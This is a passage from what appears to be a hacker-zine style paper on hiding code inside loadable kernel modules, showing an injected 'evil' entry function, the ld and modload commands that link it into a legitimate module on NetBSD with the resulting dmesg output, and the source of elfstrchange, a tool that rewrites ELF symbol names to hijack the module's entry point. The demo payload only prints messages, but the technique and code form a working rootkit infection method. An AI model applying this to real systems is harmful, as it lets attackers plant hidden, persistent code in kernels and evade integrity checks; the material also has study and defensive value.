<span style="color: #993333;">int</span> &nbsp; &nbsp; gentil_lkmentry<span style="color: black;">&#40;</span><span style="color: #993333;">struct</span> lkm_table <span style="color: #339933;">*,</span> <span style="color: #993333;">int</span><span style="color: #339933;">,</span> <span style="color: #993333;">int</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
<span style="color: #993333;">int</span><br/>
inject_entry<span style="color: black;">&#40;</span><span style="color: #993333;">struct</span> lkm_table <span style="color: #339933;">*</span>lkmt<span style="color: #339933;">,</span> <span style="color: #993333;">int</span> cmd<span style="color: #339933;">,</span> <span style="color: #993333;">int</span> ver<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">switch</span><span style="color: black;">&#40;</span>cmd<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> LKM_E_LOAD<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;evil: in place<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> LKM_E_UNLOAD<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;evil: i'll be back!<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> LKM_E_STAT<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;evil: report in progress<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">default</span><span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;edit: unknown command<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> gentil_lkmentry<span style="color: black;">&#40;</span>lkmt<span style="color: #339933;">,</span> cmd<span style="color: #339933;">,</span> ver<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>After compiling gentil and evil we link them together:</p>
<pre>
$ ld -r -o evil.o gentil.o inject.o
$ mv evil.o gentil.o

# modload -e evil_entry gentil.o
Module loaded as ID 2

# modstat 
Type    Id   Offset Loadaddr Size Info     Rev Module Name
DEV       0  -1/108 d3ed3000 0004 d3ed3440   1 mmr
DEV       1  -1/180 d3fa6000 03e0 d4090100   1 nvidia
MISC      2       0 e45b9000 0004 e45b9254   1 gentil

# modunload -n gentil

# dmesg | tail
evil: in place
gentil: Hello, world!
evil: report in progress
gentil: How you doin', world?
evil: i'll be back!
gentil: Goodbye, world!
</pre>
<p>Ok, everything worked like a charm :)</p>
<h4><a name="c523"></a>5.2.3 - OpenBSD</h4>
<p>OpenBSD don't use ELF on x86 architectures, so the tech cannot be used. I've not tested on platforms that use ELF but i think that it looks like NetBSD, so the tech can certainly be applied. Tell me if you manage to do it on OpenBSD ELF.</p>
<h2><a name="c6"></a>6 - Conclusion</h2>
<p>This paper has enlarged the number of techniques that allows to dissimulate code into the kernel. I have presented this technique because it is interesting to do it with very few and easy manipulations.</p>
<p>Have fun when playing with it :)</p>
<h2><a name="c7"></a>7 - Greetings</h2>
<p>I want to thanks mycroft, OUAH, aki and afrique for their comments and ideas. Also a big thanks to klem for teaching me reverse engineering.</p>
<p>Thanks to FXKennedy for helping me with NetBSD.</p>
<p>A big kiss to Carla for being wonderfull.</p>
<p>And finally, thanks to all #root people, `spud, hotfyre, funka, jaia, climax, redoktober ...</p>
<h2><a name="c8"></a>8 - References</h2>
<ol>
<li>Weakening the Linux Kernel by Plaguez http://www.phrack.org/show.php?p=52&amp;a=18</li>
<li>The Adore rootkit by stealth http://stealth.7350.org/rootkits/</li>
<li><a href="/lib/vsc07.html">Runtime kernel kmem patching</a> by Silvio Cesare http://vx.netlux.org/lib/vsc07.html</li>
<li>Static Kernel Patching by jbtzhm http://www.phrack.org/show.php?p=60&amp;a=8</li>
<li>Tool interface specification on ELF http://segfault.net/~scut/cpu/generic/TIS-ELF_v1.2.pdf</li>
<li>Modutils for 2.4.x kernels ftp://ftp.kernel.org/pub/linux/utils/kernel/modutils/v2.4</li>
<li>Tripwire http://www.tripwire.org</li>
<li>Solaris Loadable Kernel Modules by Plasmoid http://www.thc.org/papers/slkm-1.0.html</li>
</ol>
<h2><a name="c9"></a>9 - Codes</h2>
<h3><a name="c91"></a>9.1 - ElfStrChange</h3>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/*<br/>
&nbsp;* elfstrchange.c by truff &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c8bcbabdaeae88b8baa7a2adbcffe6a7baaf">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;<br/>
&nbsp;* Change the value of a symbol name in the .strtab section<br/>
&nbsp;*<br/>
&nbsp;* Usage: elfstrchange elf_object sym_name sym_name_replaced<br/>
&nbsp;*<br/>
&nbsp;*/</span><br/>
<br/>
<span style="color: #339933;">#include &lt;stdlib.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;stdio.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;elf.h&gt;</span><br/>
<br/>
<span style="color: #339933;">#define FATAL(X) { perror (X);exit (EXIT_FAILURE); }</span><br/>
<br/>
<br/>
<span style="color: #993333;">int</span> ElfGetSectionName <span style="color: black;">&#40;</span>FILE <span style="color: #339933;">*</span>fd<span style="color: #339933;">,</span> Elf32_Word sh_name<span style="color: #339933;">,</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Elf32_Shdr <span style="color: #339933;">*</span>shstrtable<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>res<span style="color: #339933;">,</span> <span style="color: #993333;">size_t</span> len<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
Elf32_Off ElfGetSymbolByName <span style="color: black;">&#40;</span>FILE <span style="color: #339933;">*</span>fd<span style="color: #339933;">,</span> Elf32_Shdr <span style="color: #339933;">*</span>symtab<span style="color: #339933;">,</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Elf32_Shdr <span style="color: #339933;">*</span>strtab<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>name<span style="color: #339933;">,</span> Elf32_Sym <span style="color: #339933;">*</span>sym<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
Elf32_Off ElfGetSymbolName <span style="color: black;">&#40;</span>FILE <span style="color: #339933;">*</span>fd<span style="color: #339933;">,</span> Elf32_Word sym_name<span style="color: #339933;">,</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Elf32_Shdr <span style="color: #339933;">*</span>strtable<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>res<span style="color: #339933;">,</span> <span style="color: #993333;">size_t</span> len<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
<br/>
<span style="color: #993333;">int</span> main <span style="color: black;">&#40;</span><span style="color: #993333;">int</span> argc<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">**</span>argv<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #993333;">int</span> i<span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #993333;">int</span> len <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>string<span style="color: #339933;">;</span><br/>
&nbsp; FILE <span style="color: #339933;">*</span>fd<span style="color: #339933;">;</span><br/>
&nbsp; Elf32_Ehdr hdr<span style="color: #339933;">;</span><br/>
&nbsp; Elf32_Shdr symtab<span style="color: #339933;">,</span> strtab<span style="color: #339933;">;</span><br/>
&nbsp; Elf32_Sym sym<span style="color: #339933;">;</span><br/>
&nbsp; Elf32_Off symoffset<span style="color: #339933;">;</span><br/>
<br/>
&nbsp; fd <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a> <span style="color: black;">&#40;</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;r+&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>fd <span style="color: #339933;">==</span> NULL<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; FATAL <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;fopen&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a> <span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>hdr<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span> <span style="color: black;">&#40;</span>Elf32_Ehdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">,</span> fd<span style="color: black;">&#41;</span> <span style="color: #339933;">&lt;</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; FATAL <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Elf header corrupted&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>ElfGetSectionByName <span style="color: black;">&#40;</span>fd<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>hdr<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;.symtab&quot;</span><span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>symtab<span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fprintf.html"><span style="color: #000066;">fprintf</span></a> <span style="color: black;">&#40;</span>stderr<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;Can't get .symtab section<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/exit.html"><span style="color: #000066;">exit</span></a> <span style="color: black;">&#40;</span>EXIT_FAILURE<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; <br/>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>ElfGetSectionByName <span style="color: black;">&#40;</span>fd<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>hdr<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;.strtab&quot;</span><span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>strtab<span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fprintf.html"><span style="color: #000066;">fprintf</span></a> <span style="color: black;">&#40;</span>stderr<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;Can't get .strtab section<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/exit.html"><span style="color: #000066;">exit</span></a> <span style="color: black;">&#40;</span>EXIT_FAILURE<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; <br/>
<br/>
&nbsp; symoffset <span style="color: #339933;">=</span> ElfGetSymbolByName <span style="color: black;">&#40;</span>fd<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>symtab<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>strtab<span style="color: #339933;">,</span> argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">2</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>sym<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>symoffset <span style="color: #339933;">==</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fprintf.html"><span style="color: #000066;">fprintf</span></a> <span style="color: black;">&#40;</span>stderr<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;Symbol %s not found<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span> argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">2</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/exit.html"><span style="color: #000066;">exit</span></a> <span style="color: black;">&#40;</span>EXIT_FAILURE<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <br/>
&nbsp; <br/>
&nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a> <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;[+] Symbol %s located at 0x%x<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span> argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">2</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> symoffset<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <br/>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a> <span style="color: black;">&#40;</span>fd<span style="color: #339933;">,</span> symoffset<span style="color: #339933;">,</span> SEEK_SET<span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; FATAL <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;fseek&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fwrite.html"><span style="color: #000066;">fwrite</span></a> <span style="color: black;">&#40;</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">3</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">,</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strlen.html"><span style="color: #000066;">strlen</span></a><span style="color: black;">&#40;</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">3</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fd<span style="color: black;">&#41;</span> <span style="color: #339933;">&lt;</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strlen.html"><span style="color: #000066;">strlen</span></a> <span style="color: black;">&#40;</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">3</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; FATAL <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;fwrite&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <br/>
&nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a> <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;[+] .strtab entry overwriten with %s<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span> argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">3</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <br/>
&nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a> <span style="color: black;">&#40;</span>fd<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; <span style="color: #b1b100;">return</span> EXIT_SUCCESS<span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
Elf32_Off ElfGetSymbolByName <span style="color: black;">&#40;</span>FILE <span style="color: #339933;">*</span>fd<span style="color: #339933;">,</span> Elf32_Shdr <span style="color: #339933;">*</span>symtab<span style="color: #339933;">,</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Elf32_Shdr <span style="color: #339933;">*</span>strtab<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>name<span style="color: #339933;">,</span> Elf32_Sym <span style="color: #339933;">*</span>sym<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #993333;">int</span> i<span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #993333;">char</span> symname<span style="color: black;">&#91;</span><span style="color: #0000dd;">255</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; Elf32_Off offset<span style="color: #339933;">;</span><br/>
<br/>
&nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i<span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i<span style="color: #339933;">&lt;</span><span style="color: black;">&#40;</span>symtab<span style="color: #339933;">-&gt;</span>sh_size<span style="color: #339933;">/</span>symtab<span style="color: #339933;">-&gt;</span>sh_entsize<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
&nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a> <span style="color: black;">&#40;</span>fd<span style="color: #339933;">,</span> symtab<span style="color: #339933;">-&gt;</span>sh_offset <span style="color: #339933;">+</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">*</span> symtab<span style="color: #339933;">-&gt;</span>sh_entsize<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;SEEK_SET<span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; FATAL <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;fseek&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a> <span style="color: black;">&#40;</span>sym<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span> <span style="color: black;">&#40;</span>Elf32_Sym<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">,</span> fd<span style="color: black;">&#41;</span> <span style="color: #339933;">&lt;</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; FATAL <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Symtab corrupted&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memset.html"><span style="color: #000066;">memset</span></a> <span style="color: black;">&#40;</span>symname<span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span> <span style="color: black;">&#40;</span>symname<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; offset <span style="color: #339933;">=</span> ElfGetSymbolName <span style="color: black;">&#40;</span>fd<span style="color: #339933;">,</span> sym<span style="color: #339933;">-&gt;</span>st_name<span style="color: #339933;">,</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; strtab<span style="color: #339933;">,</span> symname<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span> <span style="color: black;">&#40;</span>symname<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">!</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strcmp.html"><span style="color: #000066;">strcmp</span></a> <span style="color: black;">&#40;</span>symname<span style="color: #339933;">,</span> name<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> offset<span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <br/>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<br/>
<span style="color: #993333;">int</span> ElfGetSectionByIndex <span style="color: black;">&#40;</span>FILE <span style="color: #339933;">*</span>fd<span style="color: #339933;">,</span> Elf32_Ehdr <span style="color: #339933;">*</span>ehdr<span style="color: #339933;">,</span> Elf32_Half index<span style="color: #339933;">,</span> <br/>
&nbsp; &nbsp; Elf32_Shdr <span style="color: #339933;">*</span>shdr<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a> <span style="color: black;">&#40;</span>fd<span style="color: #339933;">,</span> ehdr<span style="color: #339933;">-&gt;</span>e_shoff <span style="color: #339933;">+</span> <span style="color: black;">&#40;</span>index <span style="color: #339933;">*</span> ehdr<span style="color: #339933;">-&gt;</span>e_shentsize<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;SEEK_SET<span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; FATAL <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;fseek&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <br/>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a> <span style="color: black;">&#40;</span>shdr<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span> <span style="color: black;">&#40;</span>Elf32_Shdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">,</span> fd<span style="color: black;">&#41;</span> <span style="color: #339933;">&lt;</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; FATAL <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Sections header corrupted&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp; <br/>
<br/>
<span style="color: #993333;">int</span> ElfGetSectionByName <span style="color: black;">&#40;</span>FILE <span style="color: #339933;">*</span>fd<span style="color: #339933;">,</span> Elf32_Ehdr <span style="color: #339933;">*</span>ehdr<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>section<span style="color: #339933;">,</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Elf32_Shdr <span style="color: #339933;">*</span>shdr<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #993333;">int</span> i<span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #993333;">char</span> name<span style="color: black;">&#91;</span><span style="color: #0000dd;">255</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; Elf32_Shdr shstrtable<span style="color: #339933;">;</span><br/>
<br/>
&nbsp; <span style="color: #808080; font-style: italic;">/*<br/>
&nbsp; &nbsp;* Get the section header string table<br/>
&nbsp; &nbsp;*/</span><br/>
